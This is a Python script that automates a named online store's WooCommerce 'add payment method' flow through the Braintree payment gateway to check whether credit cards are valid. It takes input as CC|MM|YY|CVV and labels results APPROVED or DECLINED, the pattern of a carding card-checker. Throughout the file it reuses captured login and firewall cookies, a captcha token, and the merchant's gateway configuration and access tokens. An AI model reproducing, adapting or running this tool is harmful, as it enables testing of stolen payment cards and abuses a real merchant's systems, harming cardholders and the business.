import base64
import httpx
import time
import json
import uuid
import re
import asyncio
from html import unescape
from bs4 import BeautifulSoup

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None
    token_base64 = match.group(1)
    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception as e:
        print(f"Error decoding or parsing JSON token: {e}")
        return None

def validate_expiry_date(mes, ano):
    mes = mes.zfill(2)
    if len(ano) == 4:
        ano = ano[-2:]
    try:
        expiry_month = int(mes)
        expiry_year = int(ano)
    except ValueError:
        return False, "Invalid expiry date"
    current_year = int(time.strftime("%y"))
    current_month = int(time.strftime("%m"))
    if expiry_month < 1 or expiry_month > 12:
        return False, "Expiration Month Invalid"
    if expiry_year < current_year:
        return False, "Expiration Year Invalid"
    if expiry_year == current_year and expiry_month < current_month:
        return False, "Expiration Month Invalid"
    return True, ""

async def set_mailchimp_email(email, session):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://apluscollectibles.com',
        'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    data = {
        'email': email,
        'mc_language': 'en',
        'subscribed': '1',
    }
    response = await session.post(
        'https://apluscollectibles.com/wp-admin/admin-ajax.php?action=mailchimp_set_user_by_email',
        headers=headers,
        data=data,
    )
    return response.text

async def register_user(email, session):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://apluscollectibles.com',
        'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    data = {
        'email': email,
        'wfls-email-verification': '',
        'wfls-captcha-token': '0cAFcWeA7nZYqscoY9kxyvZZl938kYoJX1zNmF_qICc7rXda6m3d3Ao41eRnkfGxTL7c-rO18NkxKxK5-uaqepHRdYIQelDT97g_0bOSX1pmoorYYboBglHst50s6jhOBJILJPFBl62y0PCBFbqLxpevYRGbbvnr9MeeJF0bQkp18rHkJIi9vWyl7nAXNVH99SRB5lUU_NYAwGFiiY5X2WS-Ud6fr_AmISym3RKH7EX-fSD0jA_s3VeXZDzLKNT8kPEct5UR1TmSV0eecoIEYhyv9BA5ZC2RZvYC9Tmmh7zFUfr93StakrHfbHQuzyDVGebDU6cOn2AQyxYF_XtLcl4QzqSb2vtne3E77JAU0ST8vCYMDUz2ZdHBhmgCi1vk3a_pfyFxOI6K0fnuagkuoesqSGg3ZYV9vEt-qFAaUcagmdYfuaRB6E9wQoGrZP0SxiC3lpt_AHjOeOU_8R9vHplVRZ8qtMVItc74hL16w77uz-TH85ft4dPwpDph-vPWXUYJPBSXTBza1UPffgPpswqKf87PmY_cQ2e4HKErDl0RhvNKr417hrzzPwPqN7jlXTLqqgBX2_BSzeTBf9LdslpfLzNDAczwOFMdudeVCY19X7ahccbKBEXGGv1iGKo2h4mKc1klybuMZnNPZ0MKXLPWBovAN4DJXFVQ_d2E9dfO1AO-nVLjaAsxEI2bwPpmrmNvs6Rlxr13kcTDOiiMyd9KthOenPQt7HfDNtkRk9kQpWtx1-kdmbUrz1Zp2_GR5jrlmvpFbJfl9dNGTkTa2_EeNeZwki2S6Am3Hssr9Df8ToHycrIzwNtH8',
        'mailchimp_woocommerce_newsletter': '1',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://apluscollectibles.com/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': time.strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': '6eb3a64309',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }
    response = await session.post(
        'https://apluscollectibles.com/my-account/add-payment-method/',
        headers=headers,
        data=data,
    )
    return response.text

async def tokenize_credit_card(cc, mes, ano, cvv, authorization_fingerprint, session):
    headers = {
        'accept': '*/*',
        'authorization': f'Bearer {authorization_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                        tokenizeCreditCard(input: $input) {
                            token
                            creditCard {
                                bin
                                brandCode
                                last4
                                cardholderName
                                expirationMonth
                                expirationYear
                                binData {
                                    prepaid
                                    healthcare
                                    debit
                                    durbinRegulated
                                    commercial
                                    payroll
                                    issuingBank
                                    countryOfIssuance
                                    productId
                                    business
                                    consumer
                                    purchase
                                    corporate
                                }
                            }
                        }
                    }''',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mes,
                    'expirationYear': ano,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '193401',
                        'streetAddress': 'Magam',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    return gets(response.text, '"token":"', '"')

async def submit_payment_method(token, nonce, session):
    cookies = {
        'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-08-31%2005%3A44%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-08-31%2005%3A44%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        '_ga': 'GA1.1.202042758.1756620848',
        '_gcl_au': '1.1.1708389002.1756620849',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Safari%2F537.36',
        'Subscribe': 'true',
        'mailchimp.cart.current_email': 'Darkboy-dev@gmail.com',
        'mailchimp.cart.previous_email': 'Darkboy-dev@gmail.com',
        'wordpress_test_cookie': 'WP%20Cookie%20check',
        'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
        'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'darkboy-ggvjmvdev%7C1757830467%7CLqS7hVE4BZRzkXN6hGE448HjfvnjTEvzZHrQqqV79kZ%7C0f7304de60a30767f287f23aa11101608e90b3c7b11a0927e580566b951355c0',
        'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8980%7Cother%7Cread%7C675530d38158510ace5e39d198722ee2fc570103cb2efe27f4ebf0dc10ec616c',
        'mailchimp_user_previous_email': 'Darkboy-ggvjmvdev%40gmail.com',
        'mailchimp_user_email': 'Darkboy-ggvjmvdev%40gmail.com',
        '_ga_D1Q49TMJ2C': 'GS2.1.s1756620848$o1$g1$t1756621139$j25$l0$h0',
        'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
    }
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://apluscollectibles.com',
        'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': token,
        'braintree_cc_device_data': '{"correlation_id":"' + str(uuid.uuid4()) + '"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n2kdbbwxghs8nhhq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n2kdbbwxghs8nhhq"},"merchantId":"n2kdbbwxghs8nhhq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"n2kdbbwxghs8nhhq","supportedNetworks":["visa","mastercard","amex","discover"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"A Plus Collectibles","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI6MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY2NDY1NTMsImp0aSI6IjE1NTMyOTAxLTEzYWMtNDRlMy1hODUxLTdkMzg2MDIxNjU4NyIsInN1YiI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.qh2PbNSWlH3NN4YyimLF0DC_1Ci91TSde9kR0Qf90g6PBcykzdKgC9E62W3LN29VkcTm2AbGTq4vuOQdqYG2CQ","paypalClientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3509894786311245549","accessToken":"access_token$production$n2kdbbwxghs8nhhq$efb9a3f38aadbbd1f9853140e03c76d7","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"A Plus Collectibles","clientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"apluscollectibles_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    response = await session.post(
        'https://apluscollectibles.com/my-account/add-payment-method/',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    return response.text

async def create_payment_method(cc, mm, yy, cvv, session):
    try:
        # Step 1: Set Mailchimp email
        await set_mailchimp_email("Darkboy-dev@gmail.com", session)
        # Step 2: Register user
        await register_user("Darkboy-dev@gmail.com", session)
        # Step 3: Get Braintree token and nonce
        cookies = {
            'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-08-31%2005%3A44%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-08-31%2005%3A44%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
            '_ga': 'GA1.1.202042758.1756620848',
            '_gcl_au': '1.1.1708389002.1756620849',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Safari%2F537.36',
            'Subscribe': 'true',
            'mailchimp.cart.current_email': 'Darkboy-dev@gmail.com',
            'mailchimp.cart.previous_email': 'Darkboy-dev@gmail.com',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'darkboy-ggvjmvdev%7C1757830467%7CLqS7hVE4BZRzkXN6hGE448HjfvnjTEvzZHrQqqV79kZ%7C0f7304de60a30767f287f23aa11101608e90b3c7b11a0927e580566b951355c0',
            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8980%7Cother%7Cread%7C675530d38158510ace5e39d198722ee2fc570103cb2efe27f4ebf0dc10ec616c',
            'mailchimp_user_previous_email': 'Darkboy-ggvjmvdev%40gmail.com',
            'mailchimp_user_email': 'Darkboy-ggvjmvdev%40gmail.com',
            '_ga_D1Q49TMJ2C': 'GS2.1.s1756620848$o1$g1$t1756621139$j25$l0$h0',
            'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
        }
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
            'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        }
        response = await session.get('https://apluscollectibles.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
        token_data = extract_braintree_token(response.text)
        if token_data is None:
            return "Failed to extract authorization fingerprint"
        authorization_fingerprint = token_data.get('authorizationFingerprint')
        # Step 4: Tokenize credit card
        token = await tokenize_credit_card(cc, mm, yy, cvv, authorization_fingerprint, session)
        if not token:
            return "Failed to tokenize credit card"
        # Step 5: Submit payment method
        final_response = await submit_payment_method(token, nonce, session)
        return final_response
    except Exception as e:
        return str(e)

def process_card_b3(cc):
    """
    Process credit card through Braintree Auth gateway
    Returns: dict with status, response, and gateway
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Braintree Auth"
            }

        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

        # Format year if needed
        if len(yy) == 4:
            yy = yy[-2:]

        # Validate expiry date
        valid, err = validate_expiry_date(mm, yy)
        if not valid:
            return {
                "status": "DECLINED",
                "response": err,
                "gateway": "Braintree Auth"
            }

        async def run():
            async with httpx.AsyncClient(timeout=40) as session:
                return await create_payment_method(cc_num, mm, yy, cvv, session)

        result = asyncio.run(run())

        # Parse the response
        error_message = ""
        try:
            soup = BeautifulSoup(unescape(result), "html.parser")
            ul = soup.find("ul", class_="woocommerce-error")
            if ul:
                li = ul.find("li")
                if li:
                    error_message = li.get_text(separator=" ", strip=True)
                    # Remove the prefix if it exists
                    if "Reason: " in error_message:
                        error_message = error_message.split("Reason: ")[1].strip()
            else:
                div = soup.find("div", class_="message-container")
                if div:
                    error_message = div.get_text(separator=" ", strip=True)
        except Exception as e:
            error_message = str(e)

        if "Payment method successfully added." in result:
            return {
                "status": "APPROVED",
                "response": "Payment method successfully added.",
                "gateway": "Braintree Auth"
            }
        else:
            return {
                "status": "DECLINED",
                "response": error_message or "Unknown error",
                "gateway": "Braintree Auth"
            }
    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing error: {str(e)}",
            "gateway": "Braintree Auth"
        }
